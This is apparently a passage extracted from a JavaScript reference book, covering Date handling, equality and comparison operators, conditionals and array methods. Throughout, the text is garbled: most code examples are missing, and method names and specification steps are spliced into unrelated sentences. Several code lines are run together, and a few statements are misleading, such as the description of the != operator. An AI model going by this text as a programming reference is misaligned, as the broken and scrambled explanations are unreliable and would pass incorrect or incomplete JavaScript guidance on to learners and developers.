Where the methods above are required to differentiate between ambiguity in dates, it is usually easier to communicate a date as the amount of time that has passed since January 1, 1970, 00:00:00 UTC. This single number represents a single point in time, and can be converted to local time whenever necessary.

Section 8.4: Formatting a JavaScript date
Formatting a JavaScript date in modern browsers
Date.prototype.toLocaleDateStringIn modern browsers (*), () allows you to define the formatting of a Date in a convenient manner.
It requires the following format :

The locales parameter should be a string with a BCP 47 language tag, or an array of such strings.
The options parameter should be an object with some or all of the following properties:
localeMatcher : possible values are "lookup" and "best fit"; the default is "best fit" timeZone : the only value implementations must recognize is "UTC"; the default is the runtime's default time zone hour12 :possible values are true and false; the default is locale dependent formatMatcher : possible values are "basic" and "best fit"; the default is "best fit" weekday : possible values are "narrow", "short" & "long" era : possible values are "narrow", "short" & "long" year : possible values are "numeric" & "2-digit" month : possible values are "numeric", "2-digit", "narrow", "short" & "long" day : possible values are "numeric" & "2-digit" hour : possible values are "numeric" & "2-digit" minute : possible values are "numeric" & "2-digit" second : possible values are "numeric" & "2-digit" timeZoneName : possible values are "short" & "long"
How to use

Output if executed on January 24	ʰ, 2036 :

Going custom
Date.prototype.toLocaleDateStringIf () isn't flexible enough to fulfill whatever need you may have, you might want to consider creating a custom Date object that looks like this:


new DateObjectIf you included that code and executed () on January 20	ʰ, 2019, it would produce an object with the following properties:

To get a formatted string, you could do something like this:

That would produce the following output:

(*) According to the MDN, "modern browsers" means Chrome 24+, Firefox 29+, IE11, Edge12+, Opera 15+ & Safari nightly build
Section 8.5: Get the number of milliseconds elapsed since 1 January 1970 00:00:00 UTC
Date.nowThe static method  returns the number of milliseconds that have elapsed since 1 January 1970 00:00:00 UTC. To get the number of milliseconds that have elapsed since that time using an instance of a Date object, use its getTime method.

Section 8.6: Get the current time and date
new DateUse () to generate a new Date object containing the current date and time.
Date() called without arguments is equivalent to new Date(Date.nowNote that ()).
Once you have a date object, you can apply any of the several available methods to extract its properties (e.g.
getFullYear() to get the 4-digits year).
Below are some common date methods.
Get the current year


Please note that 0 = January. This is because months range from 0 to 11, so it is often desirable to add +1 to the index.
Get the current day
// Sample output: 31
Get the current hour
// Sample output: 10
Get the current minutes

To get the milliseconds (ranging from 0 to 999) of an instance of a Date object, use its getMilliseconds method.
 // Output: milliseconds right now
Convert the current time and date to a human-readable string

Date.nowThe static method () returns the number of milliseconds that have elapsed since 1 January 1970 00:00:00 UTC. To get the number of milliseconds that have elapsed since that time using an instance of a Date object, use its getTime method.

Section 8.7: Increment a Date Object
To increment date objects in JavaScript, we can usually do this:

console.log(checkoutDate); // Fri Jul 22 2016 10:05:13 GMT-0400 (EDT)
It is possible to use setDate to change the date to a day in the following month by using a value larger than the number of days in the current month -
var checkoutDate = new Date();    // Thu Jul 21 2016 10:05:13 GMT-0400 (EDT) checkoutDate.setDate( checkoutDate.getDate() + 12 );
console.log(checkoutDate); // Tue Aug 02 2016 10:05:13 GMT-0400 (EDT)
The same applies to other methods such as getHours(), getMonth(),etc.
Adding Work Days
If you wish to add work days (in this case I am assuming Monday - Friday) you can use the setDate function although you need a little extra logic to account for the weekends (obviously this will not take account of national holidays) -

Section 8.8: Convert to JSON

Chapter 9: Date Comparison
Section 9.1: Comparing Date values

valueOf() or getTimeNote that you must use () to compare the values of Date objects because the equality operator will compare if two object references are the same. For example:

Whereas if the variables point to the same object:

However, the other comparison operators will work as usual and you can use < and > to compare that one date is earlier or later than the other. For example:


Section 9.2: Date Dierence Calculation
To compare the difference of two dates, we can do the comparison based on the timestamp.


Chapter 10: Comparison Operations
Section 10.1: Abstract equality / inequality and type conversion
The Problem
The abstract equality and inequality operators (== and !=) convert their operands if the operand types do not match. This type coercion is a common source of confusion about the results of these operators, in particular, these operators aren't always transitive as one would expect.

The results start to make sense if you consider how JavaScript converts empty strings to numbers.

The Solution
false B"" == "0"In the statement , both the operands are strings ("" and "0"), hence there will be no type conversion and since "" and "0" are not the same value,  is false as expected.
One way to eliminate unexpected behavior here is making sure that you always compare operands of the same type. For example, if you want the results of numerical comparison use explicit conversion:

Or, if you want string comparison:

Number("0") and new Number("0"Side-note: ) isn't the same thing! While the former performs a type conversion,
the latter will create a new object. Objects are compared by reference and not by value which explains the results below.


Finally, you have the option to use strict equality and inequality operators which will not perform any implicit type conversions.

Further reference to this topic can be found here:
Which equals operator (== vs ===) should be used in JavaScript comparisons?.
Abstract Equality (==)
Section 10.2: NaN Property of the Global Object
 "two"Math.sqrtNaN ("Not a Number") is a special value defined by the IEEE Standard for Floating-Point Arithmetic, which is used when a non-numeric value is provided but a number is expected (1 *), or when a calculation doesn't have a valid number result ((-1)).
Any equality or relational comparisons with NaN returns false, even comparing it with itself. Because, NaN is supposed to denote the result of a nonsensical computation, and as such, it isn't equal to the result of any other nonsensical computations.

NaN !== 0;          // true
NaN !== NaN;        // true
Checking if a value is NaN Version ≥ 6
You can test a value or expression for NaN by using the function Number.isNaN():


Version < 6
You can check if a value is NaN by comparing it with itself:

Number.isNaNYou can use the following polyfill for ():

isNaNBy contrast, the global function () returns true not only for NaN, but also for any value or expression that cannot be coerced into a number:

ECMAScript defines a "sameness" algorithm called SameValue which, since ECMAScript 6, can be invoked with
Object.is. Unlike the == and === comparison, using Object.is() will treat NaN as identical with itself (and -0 as not
NaN === NaN              // false
Version < 6
Object.isYou can use the following polyfill for () (from MDN):

Points to note
NaN itself is a number, meaning that it does not equal to the string "NaN", and most importantly (though perhaps unintuitively):

Section 10.3: Short-circuiting in boolean operators
The and-operator (&&) and the or-operator (||) employ short-circuiting to prevent unnecessary work if the outcome of the operation does not change with the extra work.
x && yIn , y will not be evaluated if x evaluates to false, because the whole expression is guaranteed to be false.
x || yIn , y will not be evaluated if x evaluated to true, because the whole expression is guaranteed to be true. Example with functions
Take the following two functions:

Example 1

Output:
'T'
'F'
Example 2

Output:
		'F'
Example 3

Output:
		'T'
Example 4

Output:
'F'
'T'
Short-circuiting to prevent errors
var obj; // object has value of undefined if(obj.property){ }// TypeError: Cannot read property 'property' of undefined if(obj.property && obj !== undefined){}// Line A TypeError: Cannot read property 'property' of undefined
Line A: if you reverse the order the first conditional statement will prevent the error on the second by not executing it if it would throw the error

But should only be used if you expect undefined
if(typeof obj === "object" && obj.property){}; // safe option but slower
Short-circuiting to provide a default value
The || operator can be used to select either a "truthy" value, or the default value.
For example, this can be used to ensure that a nullable value is converted to a non-nullable value:

Or to return the first truthy value

The same can be used to fall back multiple times:
envVariable || configValue || defaultConstValue // select the first "truthy" of these
Short-circuiting to call an optional function
The && operator can be used to evaluate a callback, only if it is passed:


Of course, the test above does not validate that cb is in fact a function and not just an Object/Array/String/Number.
Section 10.4: Null and Undefined
The differences between null and undefined null and undefined share abstract equality == but not strict equality ===,

They represent slightly different things:
undefined represents the absence of a value, such as before an identifier/Object property has been created or in the period between identifier/Function parameter creation and it's first set, if any.
null represents the intentional absence of a value for an identifier or property which has already been created.
They are different types of syntax:
     undefined is a property of the global Object, usually immutable in the global scope. This means anywhere you can define an identifier other than in the global namespace could hide undefined from that scope (although things can still be undefined)  null is a word literal, so it's meaning can never be changed and attempting to do so will throw an Error. The similarities between null and undefined null and undefined are both falsy.

Neither null or undefined equal false (see this question).

void foo.bartypeof fooIf the current scope can't be trusted, use something which evaluates to undefined, for example 0;.
If undefined is shadowed by another value, it's just as bad as shadowing Array or Number.
Avoid setting something as undefined. If you want to remove a property bar from an Object foo, delete ; instead.
 Existence testing identifier foo against undefined could throw a Reference Error, use  against "undefined" instead.
 Section 10.5: Abstract Equality (==)
Operands of the abstract equality operator are compared after being converted to a common type. How this conversion happens is based on the specification of the operator:
Specification for the == operator:
7.2.13 Abstract Equality Comparison
x == yThe comparison , where x and y are values, produces true or false. Such a comparison is performed as follows:
Type(x) is the same as Type1. If (y), then:
x === ya. Return the result of performing Strict Equality Comparison .
2. If x is null and y is undefined, return true.
3. If x is undefined and y is null, return true.
Type(x) is Number and Type(y) is String, return the result of the comparison x == ToNumber4. If (y).
Type(x) is String and Type(y) is Number, return the result of the comparison ToNumber(x) == y5. If .
Type(x) is Boolean, return the result of the comparison ToNumber(x) == y6. If .
Type(y) is Boolean, return the result of the comparison x == ToNumber7. If (y).
Type(x) is either String, Number, or Symbol and Typex == ToPrimitive8. If (y) is Object, return the result of the comparison (y).
Type(x) is Object and TypeToPrimitive(x) == y9. If (y) is either String, Number, or Symbol, return the result of the comparison .
10. Return false.
Examples:
1 == 1;                     // true
1 == true;                  // true  (operand converted to number: true => 1)
1 == '1';                   // true  (operand converted to number: '1' => 1 )
1 == '1.00';                // true
1 == '1.00000000001';       // false
1 == '1.00000000000000001'; // true  (true due to precision loss) null == undefined;          // true  (spec #2)
1 == 2;                     // false 0 == false;                 // true
0 == undefined;             // false
0 == "";                    // true
Section 10.6: Logic Operators with Booleans

AND
This operator will return true if both of the expressions evaluate to true. This boolean operator will employ shortcircuiting and will not evaluate y if x evaluates to false.

This will return false, because y is false.
OR
This operator will return true if one of the two expressions evaluate to true. This boolean operator will employ short-circuiting and y will not be evaluated if x evaluates to true.

This will return true, because x is true.
NOT
This operator will return false if the expression on the right evaluates to true, and return true if the expression on the right evaluates to false.

This will return false, because x is true.
Section 10.7: Automatic Type Conversions
Beware that numbers can accidentally be converted to strings or NaN (Not a Number).
JavaScript is loosely typed. A variable can contain different data types, and a variable can change its data type:

When doing mathematical operations, JavaScript can convert numbers to strings:
var x = 5 + 7;       // x.valueOf() is 12,  typeof x is a number var x = 5 + "7";     // x.valueOf() is 57,  typeof x is a string var x = "5" + 7;     // x.valueOf() is 57,  typeof x is a string var x = 5 - 7;       // x.valueOf() is -2,  typeof x is a number var x = 5 - "7";     // x.valueOf() is -2,  typeof x is a number var x = "5" - 7;     // x.valueOf() is -2,  typeof x is a number var x = 5 - "x";     // x.valueOf() is NaN, typeof x is a number
Subtracting a string from a string, does not generate an error but returns NaN (Not a Number):

Section 10.8: Logic Operators with Non-boolean values (boolean coercion)
Logical OR (||), reading left to right, will evaluate to the first truthy value. If no truthy value is found, the last value is returned.
var a = 'hello' || '';             // a = 'hello' var b = '' || [];                  // b = [] var c = '' || undefined;           // c = undefined var d = 1 || 5;                    // d = 1 var e = 0 || {};                   // e = {} var f = 0 || '' || 5;              // f = 5 var g = '' || 'yay' || 'boo';      // g = 'yay'
Logical AND (&&), reading left to right, will evaluate to the first falsy value. If no falsey value is found, the last value is returned.
var a = 'hello' && '';                  // a = '' var b = '' && [];                       // b = '' var c = undefined && 0;                 // c = undefined var d = 1 && 5;                         // d = 5 var e = 0 && {};                        // e = 0 var f = 'hi' && [] && 'done';           // f = 'done' var g = 'bye' && undefined && 'adios';  // g = undefined
This trick can be used, for example, to set a default value to a function argument (prior to ES6).

Just keep in mind that for arguments, 0 and (to a lesser extent) the empty string are also often valid values that should be able to be explicitly passed and override a default, which, with this pattern, they won't (because they are falsy).
Section 10.9: Empty Array

toString() is executed it calls [].join() if it exists, or Object.prototype.toStringjoinWhen [].() otherwise. This comparison is returning true because [].() returns '' which, coerced into 0, is equal to false ToNumber.
Beware though, all objects are truthy and Array is an instance of Object:
// Internally this is evaluated as ToBoolean([]) === true ? 'truthy' : 'falsy' [] ? 'truthy' : 'falsy'; // 'truthy'
Section 10.10: Equality comparison operations
JavaScript has four different equality comparison operations.
SameValue
It returns true if both operands belong to the same Type and are the same value.
Note: the value of an object is a reference.
Object.isYou can use this comparison algorithm via  (ECMAScript 6).
Examples:


This algorithm has the properties of an equivalence relation:
Object.is(x, xObject.is(x, y) is true if, and only if, Object.is(y, xObject.is(x, y) and Object.is(y, z) are true, then Object.is(x, zReflexivity: ) is true, for any value x
Symmetry: ) is true, for any values x and y.
Transitivity: If ) is also true, for any values x, y and z.
SameValueZero
It behaves like SameValue, but considers +0 and -0 to be equal.
Array.prototype.includesYou can use this comparison algorithm via  (ECMAScript 7).
Examples:

This algorithm still has the properties of an equivalence relation:
includesincludes(y) is true if, and only if, [y].includesincludes(y) and [y].includes(z) are true, then [x].includesReflexivity: [x].(x) is true, for any value x
Symmetry: [x].(x) is true, for any values x and y. Transitivity: If [x].(z) is also true, for any values x, y and z.
Strict Equality Comparison
It behaves like SameValue, but
Considers +0 and -0 to be equal.
Considers NaN different than any value, including itself
You can use this comparison algorithm via the === operator (ECMAScript 3).
There is also the !== operator (ECMAScript 3), which negates the result of ===.
Examples:

This algorithm has the following properties:
x === y is true if, and only if, y === xistrue, for any valuesx === y and y === z are true, then x === zSymmetry: xandy`.
Transitivity: If  is also true, for any values x, y and z.
But is not an equivalence relation because
NaN !== NaN NaN is not reflexive: 
Abstract Equality Comparison
If both operands belong to the same Type, it behaves like the Strict Equality Comparison.
Otherwise, it coerces them as follows:
undefined and null are considered to be equal
When comparing a number with a string, the string is coerced to a number
When comparing a boolean with something else, the boolean is coerced to a number
When comparing an object with a number, string or symbol, the object is coerced to a primitive If there was a coercion, the coerced values are compared recursively. Otherwise the algorithm returns false.
You can use this comparison algorithm via the == operator (ECMAScript 1).
There is also the != operator (ECMAScript 1), which negates the result of ==.
Examples:

This algorithm has the following property:
x == y is true if, and only if, y == x	 Symmetry: 	 is true, for any values x and y.
But is not an equivalence relation because
NaN != NaN == '' and 0 == '0', but '' != '0'NaN is not reflexive: 
 Transitivity does not hold, e.g. 0
 Section 10.11: Relational operators (<, <=, >, >=)
When both operands are numeric, they are compared normally:

When both operands are strings, they are compared lexicographically (according to alphabetical order):

'100' > '12' // false ('100' is less than '12' lexicographically!)
When one operand is a string and the other is a number, the string is converted to a number before comparison:

When the string is non-numeric, numeric conversion returns NaN (not-a-number). Comparing with NaN always returns false:

But be careful when comparing a numeric value with null, undefined or empty strings:

Number(null);//0When one operand is a object and the other is a number, the object is converted to a number before comparison.So null is particular case because 

Section 10.12: Inequality
Operator != is the inverse of the == operator.
Will return true if the operands aren't equal.
The JavaScript engine will try and convert both operands to matching types if they aren't of the same type. Note: if the two operands have different internal references in memory, then false will be returned.
Sample:

 != '1'In the sample above, 1 is false because, a primitive number type is being compared to a char value. Therefore, the JavaScript engine doesn't care about the datatype of the R.H.S value.
Operator: !== is the inverse of the === operator. Will return true if the operands are not equal or if their types do not match.
Example:

Section 10.13: List of Comparison Operators
Operator	Comparison	Example
i == ==	Equal0
i === "5"===	Equal Value and Type
i != !=	Not Equal5
i !== !==	Not Equal Value or Type5
i >	Greater than> 5
i <	Less than< 5
i >= >=	Greater than or equal5
i <= <=	Less than or equal5
Section 10.14: Grouping multiple logic statements
You can group multiple boolean logic statements within parenthesis in order to create a more complex logic evaluation, especially useful in if statements.

We could also move the grouped logic to variables to make the statement a bit shorter and descriptive:

Notice that in this particular example (and many others), grouping the statements with parenthesis works the same as if we removed them, just follow a linear logic evaluation and you'll find yourself with the same result. I do prefer using parenthesis as it allows me to understand clearer what I intended and might prevent for logic mistakes.
Section 10.15: Bit fields to optimise comparison of multi state data
A bit field is a variable that holds various boolean states as individual bits. A bit on would represent true, and off would be false. In the past bit fields were routinely used as they saved memory and reduced processing load. Though the need to use bit field is no longer so important they do offer some benefits that can simplify many processing tasks.
For example user input. When getting input from a keyboard's direction keys up, down, left, right you can encode the various keys into a single variable with each direction assigned a bit.
Example reading keyboard via bitfield
var bitField = 0;  // the value to hold the bits const KEY_BITS = [4,1,8,2]; // left up right down const KEY_MASKS = [0b1011,0b1110,0b0111,0b1101]; // left up right down window.onkeydown = window.onkeyup = function (e) {     if(e.keyCode >= 37 && e.keyCode <41){

Example reading as an array

|= 0b10To turn on a bit use bitwise or | and the value corresponding to the bit. So if you wish to set the 2nd bit bitField  will turn it on. If you wish to turn a bit off use bitwise and & with a value that has all by the required bit on.
bitfield &= 0b1101Using 4 bits and turning the 2nd bit off ;
You may say the above example seems a lot more complex than assigning the various key states to an array. Yes, it is a little more complex to set but the advantage comes when interrogating the state.
If you want to test if all keys are up.

You can set some constants to make things easier

You can then quickly test for many various keyboard states
if ((bitfield & KEY_UL) === KEY_UL) { // is UP and LEFT only down if (bitfield  & KEY_UL) {             // is Up left down if ((bitfield & KEY_U) === KEY_U) {   // is Up only down if (bitfield & KEY_U) {               // is Up down (any other key may be down) if (!(bitfield & KEY_U)) {            // is Up up (any other key may be down) if (!bitfield ) {                     // no keys are down
if (bitfield ) {                      // any one or more keys are down
The keyboard input is just one example. Bitfields are useful when you have various states that must in combination be acted on. JavaScript can use up to 32 bits for a bit field. Using them can offer significant performance increases. They are worth being familiar with.
Chapter 11: Conditions
Conditional expressions, involving keywords such as if and else, provide JavaScript programs with the ability to perform different actions depending on a Boolean condition: true or false. This section covers the use of JavaScript conditionals, Boolean logic, and ternary statements.
Section 11.1: Ternary operators
Can be used to shorten if/else operations. This comes in handy for returning a value quickly (i.e. in order to assign it to another variable).
For example:

In this case, result gets the 'cute' value, because the value of animal is 'kitty'. If animal had another value, result would get the 'still nice' value.
if/elseCompare this to what the code would like with  conditions.

The if or else conditions may have several operations. In this case the operator returns the result of the last expression.

Because a was equal to 0, it becomes 1, and str becomes 'not a test'. The operation which involved str was the last, so b receives the result of the operation, which is the value contained in str, i.e. 'not a test'.
Ternary operators always expect else conditions, otherwise you'll get a syntax error. As a workaround you could return a zero something similar in the else branch - this doesn't matter if you aren't using the return value but just shortening (or attempting to shorten) the operation.

if (a === 1) alert('Hey, it is 1!'As you see, ); would do the same thing. It would be just a char longer, since
it doesn't need an obligatory else condition. If an else condition was involved, the ternary method would be much cleaner.
a === 1 ? alert('Hey, it is 1!') : alert('Weird, what could it be?'); if (a === 1) alert('Hey, it is 1!') else alert('Weird, what could it be?');
Ternaries can be nested to encapsulate additional logic. For example

if/elseThis is the same as the following 

Stylistically this should only be used with short variable names, as multi-line ternaries can drastically decrease readability.
The only statements which cannot be used in ternaries are control statements. For example, you cannot use return or break with ternaries. The following expression will be invalid.

For return statements, the following would also be invalid:

To do the above properly, you would return the ternary as follows:

Section 11.2: Switch statement
Switch statements compare the value of an expression against 1 or more values and executes different sections of code based on that comparison.

The break statement "breaks" out of the switch statement and ensures no more code within the switch statement is executed. This is how sections are defined and allows the user to make "fall through" cases.

The last case is the default case. This one will run if no other matches were made.

It should be noted that a case expression can be any kind of expression. This means you can use comparisons, function calls, etc. as case values.

Multiple Inclusive Criteria for Cases
Since cases "fall through" without a break or return statement, you can use this to create multiple inclusive criteria:

Section 11.3: If / Else If / Else Control
In its most simple form, an if condition can be used like this:

false, the block is skipped.
An if condition can be expanded with an else block. The condition is checked once as above, and if it evaluates to false a secondary block will be executed (which would be skipped if the condition were true). An example:

Supposing the else block contains nothing but another if block (with optionally an else block) like this:

Then there is also a different way to write this which reduces nesting:


Some important footnotes about the above examples:
 If any one condition evaluated to true, no other condition in that chain of blocks will be evaluated, and all corresponding blocks (including the else block) will not be executed.
else if The number of 	 parts is practically unlimited. The last example above only contains one, but you can have as many as you like.
 The condition inside an if statement can be anything that can be coerced to a boolean value, see the topic on boolean logic for more details;
if-else-if The 	 ladder exits at the first success. That is, in the example above, if the value of i is 0.5 then the first branch is executed. If the conditions overlap, the first criteria occurring in the flow of execution is executed. The other condition, which could also be true is ignored.

And this will work as well:

If you want to execute multiple statements inside an if block, then the curly braces around them are mandatory. Only using indentation isn't enough. For example, the following code:

is equivalent to:

Section 11.4: Strategy
A strategy pattern can be used in JavaScript in many cases to replace a switch statement. It is especially helpful when the number of conditions is dynamic or very large. It allows the code for each condition to be independent and separately testable.
Strategy object is simple an object with multiple functions, representing each separate condition. Example:


The above object can be used as follows:

Results:

In the last case, our default function handles any missing animals.
Section 11.5: Using || and && short circuiting
The Boolean operators || and && will "short circuit" and not evaluate the second parameter if the first is true or false respectively. This can be used to write short conditionals like:

Chapter 12: Arrays
Section 12.1: Converting Array-like Objects to Arrays
What are Array-like Objects?
JavaScript has "Array-like Objects", which are Object representations of Arrays with a length property. For example:

document.getElementsByTagName or document.querySelectorAllCommon examples of Array-like Objects are the arguments object in functions and HTMLCollection or NodeList objects returned from methods like .
However, one key difference between Arrays and Array-like Objects is that Array-like objects inherit from
Object.prototype instead of Array.prototype. This means that Array-like Objects can't access common Array
forEach(), push(), map(), filter(), and sliceprototype methods like ():

Convert Array-like Objects to Arrays in ES6
Array.from1.:
Version ≥ 6

for...of2.:
Version ≥ 6

3. Spread operator:

Object.values4.:
Version ≥ 7

Object.keys5.:
Version ≥ 6
   .map((key) => arrayLike[key]); Convert Array-like Objects to Arrays in ≤ ES5
Array.prototype.sliceUse  like so:

Function.prototype.call to call Array.prototypeYou can also use  methods on Array-like objects directly, without converting them: Version ≥ 5.1

method.bind( arrayLikeObject You can also use [].) to borrow array methods and glom them on to your object:

}); // Wow! this works
Modifying Items During Conversion
Array.fromIn ES6, while using , we can specify a map function that returns a mapped value for the new array being created.
Version ≥ 6
Array.from(domList, element => element.tagName); // Creates an array of tagName's
See Arrays are Objects for a detailed analysis.
Section 12.2: Reducing values
Version ≥ 5.1
reduceThe () method applies a function against an accumulator and each value of the array (from left-to-right) to reduce it to a single value.
Array Sum
This method can be used to condense all values of an array into a single value:

reducefunction(a, bOptional second parameter can be passed to (). Its value will be used as the first argument (specified as a) for the first call to the callback (specified as )).

Version ≥ 5.1
Flatten Array of Objects
The example below shows how to flatten an array of objects into a single object.

Version ≤ 5.1

Version ≥ 6
}), {});
Version ≥ 7 array.reduce((obj, current) => ({...obj, [current.key]: current.value}), {});
Note that the Rest/Spread Properties is not in the list of finished proposals of ES2016. It isn't supported by ES2016. But we can use babel plugin babel-plugin-transform-object-rest-spread to support it.
All of the above examples for Flatten Array result in:

Version ≥ 5.1
Map Using Reduce
As another example of using the initial value parameter, consider the task of calling a function on an array of items, returning the results in a new array. Since arrays are ordinary values and list concatenation is an ordinary function, we can use reduce to accumulate a list, as the following example demonstrates:

Note that this is for illustration (of the initial value parameter) only, use the native map for working with list transformations (see Mapping values for the details).
Version ≥ 5.1
Find Min or Max Value
We can use the accumulator to keep track of an array element as well. Here is an example leveraging this to find the min value:

Version ≥ 6
Find Unique Values
Here is an example that uses reduce to return the unique numbers to an array. An empty array is passed as the second argument and is referenced by prev.

Section 12.3: Mapping values
It is often necessary to generate a new array based on the values of an existing array.
For example, to generate an array of string lengths from an array of strings:


mapIn this example, an anonymous function is provided to the () function, and the map function will call it for every element in the array, providing the following parameters, in this order:
The element itself
The index of the element (0, 1...)
The entire array
mapAdditionally, () provides an optional second parameter in order to set the value of this in the mapping function. Depending on the execution environment, the default value of this might vary:
In a browser, the default value of this is always window:

You can change it to any custom object like this:

Section 12.4: Filtering Object Arrays
filterThe () method accepts a test function, and returns a new array containing only the elements of the original array that pass the test provided.

Version ≥ 5.1

Version ≥ 6 let odd = numbers.filter(n => n % 2 !== 0); // can be shortened to (n => n % 2)
 43odd would contain the following array: [5,].
It also works on an array of objects:

Version ≥ 5.1

Version ≥ 6



This returns:

Section 12.5: Sorting Arrays
sortThe .() method sorts the elements of an array. The default method will sort the array according to string
sortUnicode code points. To sort an array numerically the .() method needs to have a compareFunction passed to it.
sort() method is impure. .sortNote: The .() will sort the array in-place, i.e., instead of creating a sorted copy of the original array, it will re-order the original array and return it.
Default Sort
Sorts the array in UNICODE order.
['s', 't', 'a', 34, 'K', 'o', 'v', 'E', 'r', '2', '4', 'o', 'W', -1, '-4'].sort();



String sorting by length (longest first)

Results in

String sorting by length (shortest first)

Results in

Numerical Sort (ascending)

Results in:

Numerical Sort (descending)

Results in:

Sorting array by even and odd numbers

Results in:

Date Sort (descending)


Results in:

Section 12.6: Iteration
A traditional for-loop
A traditional for loop has three components:
1. The initialization: executed before the look block is executed the first time
2. The condition: checks a condition every time before the loop block is executed, and quits the loop if false
3. The afterthought: performed every time after the loop block is executed
These three components are separated from each other by a ; symbol. Content for each of these three components is optional, which means that the following is the most minimal for loop possible:

Usually, though, the initialization is used to declare an index, the condition is used to compare that index with a minimum or maximum value, and the afterthought is used to increment the index:

Using a traditional for loop to loop through an array
The traditional way to loop through an array, is this:


Or, if you prefer to loop backwards, you do this:

There are, however, many variations possible, like for example this one:

... or this one ...

... or this one:

Whichever works best is largely a matter of both personal taste and the specific use case you're implementing.
Note that each of these variations is supported by all browsers, including very very old ones!
A while loop
One alternative to a for loop is a while loop. To loop through an array, you could do this:

Like traditional for loops, while loops are supported by even the oldest of browsers.
Also, note that every while loop can be rewritten as a for loop. For example, the while loop hereabove behaves the exact same way as this for-loop:

for...in
In JavaScript, you can also do this:

This should be used with care, however, as it doesn't behave the same as a traditional for loop in all cases, and there are potential side-effects that need to be considered. See Why is using "for...in" with array iteration a bad idea? for more details.
for...of
for-ofIn ES 6, the  loop is the recommended way of iterating over a the values of an array:
Version ≥ 6

for...of loop and a for...inThe following example shows the difference between a  loop:
Version ≥ 6

Array.prototype.keysThe () method can be used to iterate over indices like this:
Version ≥ 6

forEach(...The .) method is an option in ES 5 and above. It is supported by all modern browsers, as well as Internet Explorer 9 and later.
Version ≥ 5

forEachComparing with the traditional for loop, we can't jump out of the loop in .(). In this case, use the for loop, or use partial iteration presented below.
In all versions of JavaScript, it is possible to iterate through the indices of an array using a traditional C-style for loop.


Array.prototype.everyArray.prototype.everySince ES5, if you want to iterate over a portion of an array, you can use , which iterates until we return false: Version ≥ 5

Equivalent in any JavaScript version:

Array.prototype.someArray.prototype.some                       iterates until we return true: Version ≥ 5

Equivalent in any JavaScript version:

Libraries
Finally, many utility libraries also have their own foreach variation. Three of the most popular ones are these:
jQuery.each(), in jQuery:

_.each(), in Underscore.js:

_.forEach(), in Lodash.js:

See also the following question on SO, where much of this information was originally posted:
     Loop through an array in JavaScript
  Section 12.7: Destructuring an array
Version ≥ 6
An array can be destructured when being assigned to a new variable.

Elements can be skipped

Rest operator can be used too

An array can also be destructured if it's an argument to a function.


Notice the third argument is not named in the function because it's not needed.
Learn more about destructuring syntax.
Section 12.8: Removing duplicate elements
Array.prototype.filterFrom ES5.1 onwards, you can use the native method  to loop through an array and leave only entries that pass a given callback function.
In the following example, our callback checks if the given value occurs in the array. If it does, it is a duplicate and will not be copied to the resulting array.
Version ≥ 5.1 var uniqueArray = ['a', 1, 'a', 2, '1', 1].filter(function(value, index, self) {   return self.indexOf(value) === index;
}); // returns ['a', 1, 2, '1']
If your environment supports ES6, you can also use the Set object. This object lets you store unique values of any type, whether primitive values or object references:
Version ≥ 6

Section 12.9: Array comparison
For simple array comparison you can use JSON stringify and compare the output strings:



WARNING: Using the above function is dangerous and should be wrapped in a try catch if you suspect there is a chance the array has cyclic references (a reference to an array that contains a reference to itself)

Section 12.10: Reversing arrays
reverse. is used to reverse the order of items inside an array.
reverseExample for .:



Example for deepReverse:


Results in:

Section 12.11: Shallow cloning an array
Sometimes, you need to work with an array while ensuring you don't modify the original. Instead of a clone method, arrays have a slice method that lets you perform a shallow copy of any part of an array. Keep in mind that this only clones the first level. This works well with primitive types, like numbers and strings, but not objects.
To shallow-clone an array (i.e. have a new array instance but with the same elements), you can use the following one-liner:

Array.prototype.sliceThis calls the built-in JavaScript  method. If you pass arguments to slice, you can get more
slicecomplicated behaviors that create shallow clones of only part of an array, but for our purposes just calling () will create a shallow copy of the entire array.
All method used to convert array like objects to array are applicable to clone an array:
Version ≥ 6

Version ≤ 5.1

Section 12.12: Concatenating Arrays
Two Arrays


Version ≥ 6

Results in a new Array:

Multiple Arrays

Version ≥ 3
array.concatProvide more Array arguments to ()

Version ≥ 6
Provide more arguments to []

Results in a new Array:

Without Copying the First Array

Version ≥ 3
Function.prototype.applyProvide the elements of shortArray as parameters to push using 

Version ≥ 6
Use the spread operator to pass the elements of shortArray as separate arguments to push

The value of longArray is now:

Note that if the second array is too long (>100,000 entries), you may get a stack overflow error (because of how apply works). To be safe, you can iterate instead:

Array and non-array values

Version ≥ 3

Version ≥ 6

Results in a new Array:

You can also mix arrays with non-arrays

Results in a new Array:

Section 12.13: Merge two array as key value pair
When we have two separate array and we want to make key value pair from that two array, we can use array's reduce function like below:

Output:

Section 12.14: Array spread / rest
Spread operator
Version ≥ 6
With ES6, you can use spreads to separate individual elements into a comma-separated syntax:

The spread operator also acts upon strings, separating each individual character into a new string element. Therefore, using an array function for converting these into integers, the array created above is equivalent to the one below: let arr = [1, 2, 3, ...[..."456"].map(x=>parseInt(x))]; // [1, 2, 3, 4, 5, 6]
Or, using a single string, this could be simplified to:

If the mapping is not performed then:

The spread operator can also be used to spread arguments into a function:

Rest operator
The rest operator does the opposite of the spread operator by coalescing several elements into a single one
 [a, b, ...rest] = [1, 2, 3, 4, 5, 6]; // rest is assigned [3, 4, 5, 6] Collect arguments of a function:

Section 12.15: Filtering values
filterThe () method creates an array filled with all array elements that pass a test provided as a function.
Version ≥ 5.1

Version ≥ 6

Results in a new array:
[3, 4, 5]
Filter falsy values
Version ≥ 5.1 var filtered = [ 0, undefined, {}, null, '', true, 5].filter(Boolean);
Since Boolean is a native JavaScript function/constructor that takes [one optional parameter] and the filter method also takes a function and passes it the current array item as parameter, you could read it like the following:
Boolean1.(0) returns false
Boolean(undefined2.) returns false
Boolean3.({}) returns true which means push it to the returned array
Boolean(null4.) returns false
Boolean(''5.) returns false
Boolean(true6.) returns true which means push it to the returned array
Boolean7.(5) returns true which means push it to the returned array
so the overall process will result
 true[ {},, 5 ]
Another simple example
This example utilises the same concept of passing a function that takes one argument Version ≥ 5.1

Section 12.16: Searching an Array
The recommended way (Since ES5) is to use Array.prototype.find:

In any version of JavaScript, a standard for loop can be used as well:

FindIndex
The findIndex() method returns an index in the array, if an element in the array satisfies the provided testing function. Otherwise -1 is returned.


Section 12.17: Convert a String to an Array
split() method splits a string into an array of substrings. By default .splitsplit(" "The .() will break the string into substrings on spaces (" "), which is equivalent to calling .).
splitThe parameter passed to .() specifies the character, or the regular expression, to use for splitting the string.
